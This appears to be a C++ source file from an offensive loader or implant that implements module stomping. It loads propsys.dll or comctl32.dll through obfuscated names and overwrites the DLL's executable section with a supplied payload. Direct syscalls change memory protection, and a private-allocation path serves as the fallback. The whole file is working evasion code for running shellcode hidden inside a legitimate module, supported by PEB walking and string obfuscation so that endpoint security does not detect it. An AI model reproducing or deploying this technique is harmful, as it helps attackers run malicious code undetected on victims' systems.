#include "stomp.h"
#include "peb_walk.h"
#include "syscalls.h"
#include "obfstr.h"
#include <cstring>
#include <windows.h>

static bool find_text_section_info(uint8_t* base, uint8_t** text_start, size_t* text_size) {
    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    IMAGE_NT_HEADERS* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *text_start = base + sec[i].VirtualAddress;
            *text_size = sec[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

void* stomp_module(const unsigned char* payload, size_t payload_size, StompedModule* out_info) {
    memset(out_info, 0, sizeof(StompedModule));

    auto dll_name = OBFWSTR(L"propsys.dll");
    HANDLE hDll = nullptr;

    if (!load_dll_obf(dll_name.c_str(), &hDll)) {
        auto fallback = OBFWSTR(L"comctl32.dll");
        if (!load_dll_obf(fallback.c_str(), &hDll)) {
            goto alloc_fallback;
        }
    }

    {
        uint8_t* dll_base = reinterpret_cast<uint8_t*>(hDll);
        uint8_t* text_start = nullptr;
        size_t text_size = 0;

        if (!find_text_section_info(dll_base, &text_start, &text_size))
            goto alloc_fallback;

        if (text_size < payload_size)
            goto alloc_fallback;

        PVOID protect_addr = text_start;
        SIZE_T protect_size = payload_size;
        ULONG old_protect = 0;
        NTSTATUS status = sc_NtProtectVirtualMemory(
            reinterpret_cast<HANDLE>(-1),
            &protect_addr, &protect_size,
            PAGE_READWRITE, &old_protect);

        if (status != 0) goto alloc_fallback;

        memcpy(text_start, payload, payload_size);

        protect_addr = text_start;
        protect_size = payload_size;
        ULONG tmp = 0;
        sc_NtProtectVirtualMemory(
            reinterpret_cast<HANDLE>(-1),
            &protect_addr, &protect_size,
            PAGE_EXECUTE_READ, &tmp);

        out_info->base = dll_base;
        out_info->text_start = text_start;
        out_info->text_size = text_size;
        out_info->stomped = true;

        return text_start;
    }

alloc_fallback:
    PVOID alloc_base = nullptr;
    SIZE_T alloc_size = payload_size;
    NTSTATUS status = sc_NtAllocateVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &alloc_base, 0, &alloc_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || !alloc_base) return nullptr;

    memcpy(alloc_base, payload, payload_size);

    out_info->base = alloc_base;
    out_info->text_start = reinterpret_cast<uint8_t*>(alloc_base);
    out_info->text_size = alloc_size;
    out_info->stomped = false;

    return alloc_base;
}
